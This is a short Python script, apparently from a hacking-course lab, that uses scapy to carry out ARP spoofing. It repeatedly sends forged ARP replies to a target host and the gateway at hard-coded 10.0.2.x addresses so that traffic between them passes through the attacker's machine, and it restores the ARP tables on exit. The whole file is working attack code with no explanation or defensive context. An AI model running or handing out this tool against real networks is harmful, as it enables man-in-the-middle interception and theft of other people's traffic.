#!/usr/bin/env python

import scapy.all as scapy
import time
import sys

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered = scapy.srp(arp_request_broadcast, timeout=1, verbose = False)[0]
    return answered[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2,pdst=target_ip,hwdst=target_mac,psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore(destination_ip,source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2,pdst=destination_ip,hwdst=destination_mac,psrc=source_ip,hwsrc=source_mac)
    scapy.send(packet, count=4 , verbose=False)

target_ip = '10.0.2.4'
gateway_ip = '10.0.2.1'

try:
    packets_sent = 0
    while True:
        spoof(target_ip,gateway_ip)
        spoof(gateway_ip,target_ip)
        packets_sent += 2
        print('[+] Sent {} packets'.format(packets_sent))
        sys.stdout.flush()
        time.sleep(3)
except KeyboardInterrupt:
    print('Restoring ARP tables, please wait...')
    print('Quitting...')
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)